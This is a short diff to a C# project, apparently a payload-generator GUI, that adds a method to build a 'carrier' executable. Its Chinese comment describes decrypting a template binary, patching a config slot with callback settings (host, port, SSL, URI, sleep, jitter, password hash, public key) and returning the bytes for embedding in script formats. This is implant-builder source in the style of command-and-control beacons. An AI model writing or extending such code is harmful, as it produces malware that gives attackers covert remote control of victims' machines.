@@ -94,6 +94,23 @@ namespace CsdevGui
             }
         }
 
+        /// <summary>
+        /// 构建一个原生载体 PE (供脚本类格式内嵌使用): 解密模板 -> 覆写配置槽(含公钥) -> 返回字节。
+        /// </summary>
+        public static byte[] BuildCarrier(string carrierFormat, string host, int port, bool ssl,
+                                          string uri, int sleep, int jitter, string xform, string password,
+                                          byte[] pubkey)
+        {
+            string salt = "", hash = "";
+            string gateErr = MakeTokenGate(password, out salt, out hash);
+            if (gateErr != null) throw new InvalidOperationException(gateErr);
+
+            byte[] tmpl = LoadTemplate(carrierFormat);
+            int slot = FindSlot(tmpl);
+            if (slot < 0) throw new InvalidOperationException("模板里找不到配置槽定位标记");
+            return PatchConfig(tmpl, slot, host, port, ssl, uri, sleep, jitter, xform, salt, hash, pubkey);
+        }
+
         /// <summary>一次生成的结果。</summary>
         public sealed class Result
         {
